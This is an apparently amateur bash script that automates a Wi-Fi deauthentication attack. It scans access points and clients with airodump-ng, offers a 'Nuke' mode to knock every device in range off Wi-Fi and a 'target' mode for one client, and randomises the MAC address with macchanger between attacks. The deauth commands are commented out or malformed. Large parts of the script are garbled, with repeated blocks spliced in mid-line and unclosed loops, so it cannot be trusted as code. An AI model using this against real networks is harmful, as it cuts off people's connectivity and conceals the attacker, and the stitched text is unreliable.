#!/bin/bash

#TO-DO MAke the file management and file creation and rm collector so only files are created and overwritten 


echo Hello 
echo Configureing wifi and removing processes that might such
airmon-ng check | grep [0-9] > killPStemp.txt
echo removing these extra processes!
cat killPStemp.txt
grep -v "Found" killPStemp.txt > killPS.txt
kill $(gawk '{print $1}' killPS.txt)
rm killPStemp.txt killPS.txt
echo all the processes is gone now sorry if that was something important
sleep 3

#airodump-ng --write netList --output-format csv wlan0
airodump-ng --write netList --output-format csv wlan0 &
#This get's the PID of the last executed command in shell	
PID=$! 
sleep 5 
kill -TERM $PID


		sleep 60
		kill -TERM $PID2
		gawk '{print $1}' clientList-01.csv > netListClient.txt
		sed 's/,//g' netListClient.txt > noNetListClient.txt
	        CLTNUM=$(wc -l netListClient.txt | gawk '{print $1}')	
		clear
                echo Pick the Client/Station you want to take down!
		COUNT=0
		while [ $COUNT -lt $CLTNUM ]; do
			

#macaddress
gawk '{print $1}' netList-01.csv > netListBSSID.txt
gawk '{print $10}' netList-01.csv > netListPower.txt 
gawk '{print $18}' netList-01.csv > netListKey.txt
gawk '{print $6}' netList-01.csv > netListChannel.txt

#might want to change this don't like how this is done
NETNUM=$(wc -l netListKey.txt | gawk '{print $1}')

echo There are almost $NETNUM 
sleep 3

echo Pick which network you want to take down...Or Pick EMP for all of them! 
p=p 

COUNTER=0
while [ $COUNTER -lt $NETNUM ]; do 
	echo "#"$COUNTER":"
	p=p
	echo Network Name: | sed -n $COUNTER$p netListKey.txt
	sed 's/,//g' netListBSSID.txt > noNetListBSSID.txt
	sed -n $COUNTER$p noNetListBSSID.txt 
	sed 's/,//g' netListChannel.txt > noNetListChannel.txt
      	sed -n $COUNTER$p noNetListChannel.txt
	echo ""
	let COUNTER=COUNTER+1
done

echo Again Enter the number of the network you wish to destory...
echo You can also enter "'target'" and the network number to target a device on network
echo Please Dont go Nucular you never know what someone is doing on the wifi
		sleep 60
		kill -TERM $PID2
		gawk '{print $1}' clientList-01.csv > netListClient.txt
		sed 's/,//g' netListClient.txt > noNetListClient.txt
	        CLTNUM=$(wc -l netListClient.txt | gawk '{print $1}')	
		clear
                echo Pick the Client/Station you want to take down!
		COUNT=0
		while [ $COUNT -lt $CLTNUM ]; do
			e is using on the internet 
echo SO enter "'Nuke'" to disconnect all devices in range of network card from wifi
echo "" 
echo list of commands "are '#', 'target', 'Nuke'"
echo enter ctrl+c to break out of the loops but also kill ps after!
read deadMacAddress
while true 
do
p=p	
	if [ "$deadMacAddress" = "Nuke" ]; then
		echo Wow I cant beleieve you enetered tha
		echo Please think about it and wait 30 seconds
		sleep 5
		echo Wow I cant beleieve you enetered that
		echo Please think about it and wait 30 seconds
		echo think about if someone has a disability 
		sleep 25	
		COUNTER=0
		while [ $COUNTER -lt $NETNUM ]; do
			echo "#"$COUNTER":"
			sed -n $COUNTER$p netListKey.txt
			sed -n $COUNTER$p netListBSSID.txt
			iwconfig wlan0 channel $COUNTER
			#aireplay-ng -0 -5 -a | sed -n $COUNTER$p netListBSSID.txt wlan0 &
			let COUNTER=COUNTER+1
		done
	elif [ "$deadMacAddress" = "target" ]
       	then 
		echo please enter the number of network you want to target 
		echo and we will list the clients that you can target
		read macAddressTarget
		#iwconfig wlan0 channel | sed -n $macAddressTarget$p noNetListChannel.txt  
	        echo Looking at the clients on the following mac address 	
		MACADD=$(sed -n $macAddressTarget$p noNetListBSSID.txt)
		NETNAME=$(sed -n $macAddressTarget$p netListKey.txt)
		echo "$MACADD"
		echo Will scan for 60 seconds to make sure all clients are captured
		echo ""
		airodump-ng --bssid $MACADD --write clientList --output-format csv wlan0 & 
		PID2=$! 
		sleep 60
		kill -TERM $PID2
		sleep 60
		kill -TERM $PID2
		gawk '{print $1}' clientList-01.csv > netListClient.txt
		sed 's/,//g' netListClient.txt > noNetListClient.txt
	        CLTNUM=$(wc -l netListClient.txt | gawk '{print $1}')	
		clear
                echo Pick the Client/Station you want to take down!
		COUNT=0
		while [ $COUNT -lt $CLTNUM ]; do
		gawk '{print $1}' clientList-01.csv > netL
		sleep 60
		kill -TERM $PID2
		gawk '{print $1}' clientList-01.csv > netListCl
		sleep 60
		kill -TERM $PID2
		gawk '{print $1}' clientList-01.csv > netListClient.txt
		sed 's/,//g' netListClient.txt > noNetListClient.txt
	        CLTNUM=$(wc -l netListClient.txt | gawk '{print $1}')	
		clear
                echo Pick the Client/Station you want to take down!
		COUNT=0
		while [ $COUNT -lt $CLTNUM ]; do
			ient.txt
		sed 's/,//g' netListClient.txt > noNetListClient.txt
	        CLTNUM=$(wc -l netListClient.txt | gawk '{print $1}')	
		clear
                echo Pick the Client/Station you want to take down!
		COUNT=0
		while [ $COUNT -lt $CLTNUM ]; do
			istClient.txt
		sed 's/,//g' netListClient.txt > noNetListClient.txt
	        CLTNUM=$(wc -l netListClient.txt | gawk '{print $1}')	
		clear
                echo Pick the Client/Station you want to take down!
		COUNT=0
		while [ $COUNT -lt $CLTNUM ]; do
			echo "#"$COUNT":"
			sed -n $COUNT$p netListClient.txt 
			let COUNT=COUNT+1
		done-n
		echo Pick the Client/Station you want to take down by entering the number below:
		read clientTarget
		echo client/station target is 
		CLTADD=$(sed -n $clientTarget$p noNetListClient.txt)
		echo ""
		while true
		do
			echo Attacking that specific device "$CLTADD" on "$NETNAME"   
			#aireplay-ng -0 5 -a "$MACADD" -c | sed -n $clientTarget$p noNetListClient.txt wlan0
			ifconfig wlan0 down
			macchanger -r wlan0
			iwconfig wlan0 mode monitor 
			ifconfig wlan0 up 
			iwconfig wlan0 | grep Mode
			sleep 5
			echo NYAN  waiting before attacking "$CLTADD" again NYAN 
		done
	else 
		echo changing to the channel of the network you are targeting 
		#iwconfig wlan0 channel | sed -n $deadMacAddress$p noNetListChannel.txt
		iwconfig wlan0 channel $deadMacAddress
		echo Taking out that connnection
		#aireplay-ng -0 5 -a | sed -n $deadMacAddress$p noNetListBSSID.txt wlan0
	fi
	ifconfig wlan0 down
	macchanger -r wlan0 
	iwconfig wlan0 mode monitor 
	ifconfig wlan0 up 
	iwconfig wlan0 | grep Mode 
	sleep 3	
done
rm netList-01.csv
rm clientList-o1.csv
